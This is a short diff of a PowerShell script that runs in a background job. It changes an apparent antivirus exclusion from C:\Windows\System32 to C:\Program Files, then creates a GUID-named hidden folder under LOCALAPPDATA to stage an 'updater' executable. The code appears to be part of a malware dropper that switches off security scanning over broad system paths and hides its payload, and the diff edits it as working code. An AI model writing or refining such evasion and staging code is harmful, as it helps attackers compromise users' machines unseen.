@@ -32,7 +32,7 @@ Start-Job -ScriptBlock {
         } catch {}
     }
 
-    Add-Exclusion -Path "C:\Windows\System32"
+    Add-Exclusion -Path "C:\Program Files"
 
     $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
     $tempPath = Join-Path $hiddenFolder $updaterExe
